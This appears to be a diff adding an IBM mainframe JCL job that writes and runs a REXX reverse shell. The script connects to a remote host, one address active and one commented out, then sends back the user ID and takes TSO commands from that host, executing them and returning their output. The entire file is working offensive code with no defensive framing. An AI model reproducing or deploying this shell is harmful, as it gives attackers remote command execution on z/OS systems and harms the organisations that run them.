@@ -1,0 +1,73 @@
+//CICSUSER JOB (123456768),CLASS=A
+//*
+//EXIST2  EXEC PGM=IDCAMS
+//SYSPRINT DD  SYSOUT=*
+//SYSIN    DD  *
+ LISTC ENT('TEST1.REV5')
+ IF LASTCC = 0 THEN DELETE 'TEST1.REV5'
+/*
+//CREATERX  EXEC PGM=IEBGENER
+//SYSPRINT   DD SYSOUT=*
+//SYSIN      DD DUMMY
+//SYSUT2     DD DSN=TEST1.REV5,
+//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
+//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT1     DD *
+  /* REXX */ 
+ /* nl ='25'x;reverse('213.152.162.84','60738');exit */
+   nl ='25'x;reverse('192.168.1.16','8443');exit
+ reverse:
+ PARSE ARG rhost,  rport
+    t=SOCKET('INITIALIZE','CLIENT',2);
+    t=SOCKET('SOCKET',2,'STREAM','TCP');
+    parse var t socket_rc s . ;
+    if socket_rc <> 0 then do
+       t= SOCKET('TERMINATE');exit 1;end
+    t=Socket('SETSOCKOPT',s,'SOL_SOCKET','SO_KEEPALIVE','ON')
+    t=SOCKET('SETSOCKOPT',s,'SOL_SOCKET','SO_ASCII','On')
+    t=SOCKET('SOCKETSETSTATUS','CLIENT')
+    t=SOCKET('CONNECT',s,'AF_INET' rport rhost)
+    t= SOCKET('SEND',s, 'Shell> ')
+  DO FOREVER
+  g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
+ close_socket:
+    parse arg exito .
+    te = SOCKET('CLOSE',s); exit;return 0
+ get_cmd:
+ parse arg socket_to_use
+    sox = SOCKET('RECV',socket_to_use,10000);
+    parse var sox s_rc s_type s_port s_ip s_results;
+    parse var sox s_rc s_data_len s_data_text;
+    if s_rc <> 0 then do CALL close_socket(1);end
+    c = DELSTR(s_data_text, LENGTH(s_data_text)); return c;
+  INLIST: procedure
+     arg sock, socklist; do i=1 to words(socklist)
+       if words(socklist) = 0 then return 0
+       if sock = word(socklist,i) then return 1;end;return 0
+ current_user:
+   text = nl||'userID: '||userid()||nl; return text
+ exec_tso:
+   parse arg tso_do
+   text = nl||'Issuing TSO Command: '||tso_do||nl
+   u = OUTTRAP('tso_out.'); ADDRESS TSO tso_do;
+   u = OUTTRAP(OFF);DO i = 1 to tso_out.0
+      text = text||tso_out.i||nl;end;return text
+ exec_cmd:
+ parse arg sockID, do_it; parse var do_it do_it do_commands
+ SELECT
+  WHEN do_it = 'getuid' THEN DO
+    te=SOCKET('SEND',sockID, current_user()||nl); end
+  WHEN do_it = 'tso' | do_it = 'execute' THEN do
+   t=SOCKET('SEND',sockID, exec_tso(do_commands)||nl);end
+  WHEN do_it = 'exit' THEN DO
+    call close_socket '1';exit;end;end
+ te = SOCKET('SEND',sockID, 'Shell> ');return 1;
+/*
+//SYSOUT     DD SYSOUT=*
+//STEP01 EXEC  PGM=IKJEFT01
+//SYSTSPRT DD  SYSOUT=*
+//SYSTSIN  DD *
+ EX 'TEST1.REV5'
+/*
+//SYSIN    DD  DUMMY
+//
